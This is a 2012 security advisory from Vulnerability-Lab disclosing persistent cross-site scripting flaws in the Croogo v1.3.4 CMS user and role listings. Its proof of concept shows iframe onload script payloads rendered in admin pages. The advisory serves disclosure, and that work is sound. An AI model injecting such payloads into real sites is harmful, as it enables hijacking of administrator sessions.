Title:
======
Croogo v1.3.4 CMS - Multiple Web Vulnerabilities


Date:
=====
2012-04-28


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=533


VL-ID:
=====
533


Introduction:
=============
A CakePHP powered Content Management System. Croogo is a free and open source content management system,
built on top of CakePHP framework. Impacts the following features ...

    Content
        Content Types: You can create your own content type
            Blog
            Node
            Page
        Taxonomy: Categorization of your content
        WYSIWYG Editor
            Attachments (for image and file uploads)
        Comments
            Threaded comments
            Email notification
            Moderation
            Spam protection (requires Akismet API key)
            Captcha (requires Recaptcha API key)
        Syndication: RSS feeds for
            Individual content types
            All promoted items
            Comments
        SEO
            Search engine friendly URLs
            Full control over meta tags
        Custom fields
    Menu Manager
    Blocks
    Contact forms
        Email notification
        Messages archive
        Spam protection (requires Akismet API key)
        Captcha (requires Recaptcha API key)
    File Manager
    Users
        ACL Manager (Permissions)
    Themes
    Web based administration


(Copy of the Vendor Homepage: http://www.croogo.org/ )


Abstract:
=========
The Vulnerability Laboratory Research Team discovered multiple Web Vulnerabilities in the Croogo v1.3.4 Content Management System.


Report-Timeline:
================
2012-04-26:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
Multiple persistent input validation vulnerabilities are detected in the Croogo v1.3.4 Content Management System. 
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent). Successful exploitation 
of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) context manipulation. Exploitation requires 
low user inter action. Attackers can inject malicious strings as username to execute them when a admin is processing to view, review 
or list username or names. The bug is located on application side & the execution is persistent out of the web application context.

Vulnerable Module(s):
				[+] User Listing - Username & Name
				[+] Role Listing - Name & Alias

Picture(s):
				../1.png
				../2.png
				../3.png


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers with low required user inter action. For demonstration or reproduce ...

URL: http://croogo.127.0.0.1:80/croogo/admin/users

<td>"><iframe src="a" onload='alert("VL")' <<="" td=""> <td>"><iframe src=a onload=alert("VL") 
<</td> <td>asdasd@aol.com</td> 

<td><a href="/croogo/admin/users/edit/2">Edit</a>  <a href="/croogo/admin/users/delete/2/token:
c68c0779f65f5657a8d17c28daebcc7a15fe51e3" 

onclick="return confirm('Are you sure?');">Delete</a></td></tr>


URL: http://croogo.127.0.0.1:80/croogo/admin/roles

<tr class="striped"><td>4</td> <td>"><iframe src="a" onload='alert("VL")' 
<<="" td=""> <td>"><iframe src=a onload=alert("VL") <</td> <td>
<a href="/croogo/admin/roles/edit/4">Edit</a>  <a href="/croogo/admin/roles/delete


Risk:
=====
The security risk of the persistent input validation vulnerabilities are estimated as medium(+).


Credits:
========
Vulnerability Laboratory [Research Team] - Chokri Ben Achor (meister@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2012 Vulnerability-Lab




-- 
VULNERABILITY RESEARCH LABORATORY TEAM
Website: www.vulnerability-lab.com
Mail: research@vulnerability-lab.com

